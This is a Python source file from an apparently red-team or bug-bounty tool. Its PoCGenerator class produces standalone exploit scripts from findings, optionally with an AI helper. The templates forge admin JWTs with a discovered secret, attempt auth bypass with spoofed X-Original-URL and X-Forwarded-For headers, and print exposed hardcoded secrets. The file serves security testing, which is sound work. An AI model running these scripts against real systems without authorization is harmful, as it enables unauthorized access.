import json
import textwrap
from typing import Dict, Any, Optional
from fbh.infrastructure.utils.logger import logger
from fbh.infrastructure.utils.ai_hunter import ai_hunter

class PoCGenerator:
    """Autonomous Engine for generating standalone Proof-of-Concept exploits"""
    
    @staticmethod
    def generate_python_poc(finding: Dict[str, Any], use_ai: bool = False) -> str:
        """Generate a Python script PoC for a finding"""
        if use_ai:
            ai_poc = ai_hunter.generate_poc(finding)
            if ai_poc:
                return ai_poc
            logger.warning("[!] AI PoC generation failed, falling back to templates")

        category = finding.get('category', '').upper()
        title = finding.get('title', 'Unknown Identifying Factor')
        location = finding.get('location', '')
        poc_data = finding.get('poc', '{}')
        
        try:
            parsed_poc = json.loads(poc_data) if isinstance(poc_data, str) else poc_data
        except:
            parsed_poc = {}

        if 'JWT' in category or 'JWT' in title:
            return PoCGenerator._jwt_poc(location, parsed_poc)
        elif 'AUTH' in category or 'BYPASS' in title.upper():
            return PoCGenerator._auth_bypass_poc(location, parsed_poc)
        elif 'STORAGE' in category or 'HARDCODED' in title.upper():
            return PoCGenerator._sensitive_data_poc(location, parsed_poc)
        
        return PoCGenerator._generic_requests_poc(location, parsed_poc)

    @staticmethod
    def _jwt_poc(url: str, data: Dict) -> str:
        secret = data.get('secret', 'CHANGE_ME')
        payload = data.get('payload', {'user': 'admin'})
        
        script = f"""
import jwt # pip install PyJWT
import requests

# FBH Autonomous PoC: JWT Misconfiguration
target_url = "{url}"
secret = "{secret}"
payload = {payload}

print(f"[*] Attempting to forge JWT for {{target_url}} using secret: {{secret}}")
token = jwt.encode(payload, secret, algorithm="HS256")

headers = {{
    "Authorization": f"Bearer {{token}}",
    "User-Agent": "FBH-Sentinel/5.1 (RedTeam Simulation)"
}}

response = requests.get(target_url, headers=headers)
print(f"[*] Response Code: {{response.status_code}}")
print(f"[*] Response Content: {{response.text[:500]}}...")

if response.status_code == 200:
    print("[+] SUCCESS: JWT forgery successful and authenticated access granted.")
else:
    print("[-] FAILED: Server rejected the forged token.")
"""
        return textwrap.dedent(script).strip()

    @staticmethod
    def _auth_bypass_poc(url: str, data: Dict) -> str:
        method = data.get('method', 'GET')
        headers = data.get('headers', {})
        
        script = f"""
import requests

# FBH Autonomous PoC: Auth Bypass
target_url = "{url}"
method = "{method}"

print(f"[*] Attempting unprotected {{method}} access to {{target_url}}")

headers = {{
    "User-Agent": "FBH-Sentinel/5.1 (RedTeam Simulation)",
    "X-Original-URL": target_url, # Potential bypass header
    "X-Forwarded-For": "127.0.0.1"
}}

try:
    if method == "POST":
        response = requests.post(target_url, headers=headers, timeout=10)
    else:
        response = requests.get(target_url, headers=headers, timeout=10)
        
    print(f"[*] Response Code: {{response.status_code}}")
    if response.status_code == 200:
        print("[+] SUCCESS: Endpoint accessed without valid session/token.")
except Exception as e:
    print(f"[-] ERROR: Connection failed: {{e}}")
"""
        return textwrap.dedent(script).strip()

    @staticmethod
    def _sensitive_data_poc(location: str, data: Dict) -> str:
        value = data.get('value', 'HIDDEN')
        
        script = f"""
# FBH Autonomous PoC: Insecure Data Storage / Hardcoded Secret
# Location: {location}

found_secret = "{value}"

print(f"[*] Identified Sensitive Constant at {location}")
print(f"[*] Secret Value: {{found_secret}}")
print("[!] RECOMMENATION: Move this secret to a secure Vault/KeyStore and obfuscate binary.")
"""
        return textwrap.dedent(script).strip()

    @staticmethod
    def _generic_requests_poc(url: str, data: Dict) -> str:
        script = f"""
import requests

# FBH Autonomous PoC: Generic Vulnerability Test
target_url = "{url}"

print(f"[*] Dispatching validation request to {{target_url}}")

headers = {{
    "User-Agent": "FBH-Sentinel/5.1 (RedTeam Simulation)"
}}

response = requests.get(target_url, headers=headers, timeout=10)
print(f"[*] Received Response ({{response.status_code}})")
"""
        return textwrap.dedent(script).strip()
